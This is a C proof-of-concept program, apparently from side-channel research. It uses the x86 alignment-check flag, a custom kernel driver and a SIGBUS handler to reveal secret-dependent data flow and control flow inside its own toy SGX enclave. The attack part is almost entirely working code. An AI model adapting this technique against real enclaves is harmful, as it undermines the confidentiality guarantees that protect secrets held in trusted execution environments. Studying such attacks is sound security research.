#ifndef _GNU_SOURCE
    #define _GNU_SOURCE
#endif
#include <sched.h>
#include <stdio.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sgx_urts.h>
#include <sgx_error.h>
#include "Enclave/inc_u.h"
#include "../driver/driver_ioctl.h"

sgx_status_t sgx_rv;
int fd_am = -1;
int ac_fired = 0;

#define ENCLAVE_PATH                "./Enclave/inc.so"
#define ENCLAVE_DBG                 1

#define SGX_ASSERT(f)  { if ( SGX_SUCCESS != (sgx_rv = (f)) )           \
 {                                                                      \
       printf( "Error calling enclave at %s:%d (rv=0x%x)\n", __FILE__,  \
                                              __LINE__, sgx_rv);        \
       abort();                                                         \
 } }

#define ASSERT(cond)                                                    \
    do {                                                                \
        if (!(cond))                                                    \
        {                                                               \
            perror("[" __FILE__ "] assertion '" #cond "' failed");      \
            abort();                                                    \
        }                                                               \
    } while(0)

#define ENABLE_AC 					                                    \
    do {                                                                \
        ac_fired = 0;                                                   \
        ASSERT( ioctl(fd_am, DRV_AM_IOCTL_SET_AM) >= 0 );               \
        __asm__("pushf\norl $0x40000,(%rsp)\npopf");                    \
    } while(0)

#define DISABLE_AC 					                                    \
    do {                                                                \
        __asm__("pushf\nandl $~(0x40000),(%rsp)\npopf");                \
        if (!ac_fired)                                                  \
            puts("---> OK");                                            \
    } while(0)

static void sigbus_hdl(int sig, siginfo_t *siginfo, void *ptr)
{
    ac_fired++;
    DISABLE_AC;
    puts("---> FAIL: caught SIGBUS");

    /* Call driver to clear CR0.AM and allow the enclave to continue */
    ASSERT( ioctl(fd_am, DRV_AM_IOCTL_CLEAR_AM) >= 0 );
}

int main( int argc, char **argv )
{
    struct sigaction act;
	sgx_enclave_id_t eid = 0;
	sgx_status_t ret = SGX_SUCCESS;
    cpu_set_t cpuset;
    uint16_t rv = 0x00;
    int len  = 0;
    char buf[100];

    puts("Opening /dev/drv-am ...");
    ASSERT((fd_am = open("/dev/drv-am", O_RDWR)) >= 0);

    puts("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( ENCLAVE_PATH, ENCLAVE_DBG,
                                    NULL, NULL, &eid, NULL ) );
    puts("pinning to CPU 1...");
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    ASSERT(sched_setaffinity(0, sizeof(cpuset), &cpuset) >= 0);

    puts("registering SIGBUS handler..");
    memset (&act, 0, sizeof(act));
    act.sa_sigaction = sigbus_hdl;
    act.sa_flags = SA_SIGINFO;
    ASSERT( !sigaction(SIGBUS, &act, 0) );

    /* Dry run to allocate pages etc. */
    SGX_ASSERT( ecall_data_lookup( eid, &rv, 0) );
    SGX_ASSERT( ecall_control_flow( eid, &rv, 0) );

    printf("\n--------------------------------------------------\n");
    puts("RFLAGS.AC secret-dependent data flow");
    printf("--------------------------------------------------\n");
    for (int i=0; i<2; i++)
    {
        puts("\nRunning victim w input=0");
        ENABLE_AC;
        SGX_ASSERT( ecall_data_lookup( eid, &rv, 0) );
        DISABLE_AC;
        printf("enclave lookup(0)=%#x\n", rv);

        puts("\nRunning victim w input=1");
        ENABLE_AC;
        SGX_ASSERT( ecall_data_lookup( eid, &rv, 1) );
        DISABLE_AC;
        printf("enclave lookup(1)=%#x\n", rv);
    }

    printf("\n--------------------------------------------------\n");
    puts("RFLAGS.AC secret-dependent control flow");
    printf("--------------------------------------------------\n");
    for (int i=0; i<2; i++)
    {
        puts("\nRunning victim w input=0");
        ENABLE_AC;
        SGX_ASSERT( ecall_control_flow( eid, &rv, 0) );
        DISABLE_AC;

        puts("\nRunning victim w input=1");
        ENABLE_AC;
        SGX_ASSERT( ecall_control_flow( eid, &rv, 1) );
        DISABLE_AC;
    }

    puts("\nall is well; exiting..");
    return 0;
}
